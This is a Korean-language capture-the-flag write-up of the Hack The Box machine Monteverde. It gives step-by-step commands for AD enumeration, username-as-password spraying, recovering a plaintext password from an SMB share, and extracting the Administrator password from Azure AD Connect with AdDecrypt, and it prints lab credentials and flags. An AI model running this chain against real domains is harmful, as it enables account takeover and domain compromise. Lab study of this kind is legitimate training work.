# HTB — Monteverde

**OS:** Windows (Server 2019) **Difficulty:** Medium **IP:** 10.129.228.111 **Tags:** `active-directory` `smb` `password-spraying` `azure-ad-connect` `winrm`

---

## Summary

Monteverde는 AD 환경에서 익명 LDAP 열거로 유저 목록을 수집하고, password spraying으로 SABatchJobs 계정을 획득한다. SMB 공유에서 mhope의 Azure 설정 파일을 발견해 패스워드를 얻고, Azure AD Connect 패스워드 추출 공격으로 Administrator 크레덴셜을 획득하는 머신이다.

---

## Reconnaissance

### Port Scan

```bash
nmap -p- --min-rate 10000 10.129.228.111
```

```
PORT    STATE SERVICE
53/tcp  open  domain
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

### 도메인 정보 확인

```bash
crackmapexec smb 10.129.228.111
# domain: MEGABANK.LOCAL
```

---

## Enumeration

### 유저 목록 수집 (익명 LDAP)

```bash
enum4linux -a 10.129.228.111
```

발견된 유저:

- AAD_987d7f2f57d2 (AD Connect 동기화 서비스 계정)
- dgalanos
- mhope
- roleary
- SABatchJobs
- smorgan
- svc-ata
- svc-bexec
- svc-netapp

---

## Exploitation

### Password Spraying (username = password)

```bash
cat > users.txt << 'EOF'
SABatchJobs
mhope
dgalanos
roleary
smorgan
svc-ata
svc-bexec
svc-netapp
EOF

crackmapexec smb 10.129.228.111 -u users.txt -p users.txt --continue-on-success
```

**SABatchJobs:SABatchJobs** `[+]` 성공!

### SMB 열거

```bash
crackmapexec smb 10.129.228.111 -u SABatchJobs -p SABatchJobs --shares
smbclient //10.129.228.111/users$ -U SABatchJobs%SABatchJobs
```

`users$` 공유에서 `mhope` 폴더 발견:

```bash
cd mhope
ls
get azure.xml
```

### azure.xml 분석

```bash
cat azure.xml
# <S N="Password">4n0therD4y@n0th3r$</S>
```

mhope 패스워드: **`4n0therD4y@n0th3r$`**

### WinRM 접속 (mhope)

```bash
evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
```

---

## User Flag

```bash
type C:\Users\mhope\Desktop\user.txt
# a359442f7be113638c84b51fae4031c5
```

---

## Privilege Escalation

### mhope 권한 확인

```bash
whoami /groups
# Azure Admins 그룹 멤버
```

Azure Admins는 Azure AD Connect 서비스에 접근 가능 → 패스워드 추출 가능.

### Azure AD Connect 패스워드 추출

**Kali에서 AdDecrypt 다운로드:**

```bash
cd ~/AdSyncDecrypt
wget https://github.com/VbScrub/AdSyncDecrypt/releases/download/v1.0/AdDecrypt.zip
unzip AdDecrypt.zip
```

**evil-winrm에서 업로드:**

```bash
upload /home/kali/AdSyncDecrypt/AdDecrypt.exe
upload /home/kali/AdSyncDecrypt/mcrypt.dll
```

**Azure AD Sync Bin 디렉토리에서 실행:**

```bash
cd "C:\Program Files\Microsoft Azure AD Sync\Bin"
C:\Users\mhope\Documents\AdDecrypt.exe -FullSQL
```

```
DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```

### Administrator로 접속

```bash
evil-winrm -i 10.129.228.111 -u administrator -p 'd0m@in4dminyeah!'
```

---

## Root Flag

```bash
type C:\Users\Administrator\Desktop\root.txt
# 0d99a868acbdc4198e8bd29975a102a4
```

---

## Attack Chain

```
Port Scan
  → enum4linux → 유저 목록 수집
    → Password Spraying → SABatchJobs:SABatchJobs
      → SMB users$ → mhope/azure.xml → 패스워드 발견
        → evil-winrm (mhope)
          → Azure Admins 그룹 확인
            → AdDecrypt → Administrator 패스워드 추출
              → evil-winrm (Administrator) → root
```

---

## Key Takeaways

- **익명 LDAP/SMB 열거**: AD 환경에서 인증 없이 유저 목록 수집 가능. `enum4linux`, `crackmapexec` 필수 도구.
- **Password Spraying**: 유저명 = 패스워드 패턴은 실전에서도 자주 발생. 계정 잠금 정책 확인 후 시도.
- **SMB 공유 파일 분석**: `azure.xml` 같은 설정 파일에 평문 패스워드가 저장되는 경우가 많음. 모든 공유 파일 꼼꼼히 확인.
- **Azure AD Connect 공격**: Azure Admins 권한이 있으면 ADSync DB에서 동기화 계정 패스워드를 복호화 가능. 복호화된 패스워드가 Domain Admin인 경우 즉시 DA 획득.
- **AAD_987d7f2f57d2**: AD Connect 동기화 서비스 계정. 이런 계정이 보이면 Azure AD Connect 공격 벡터를 의심할 것.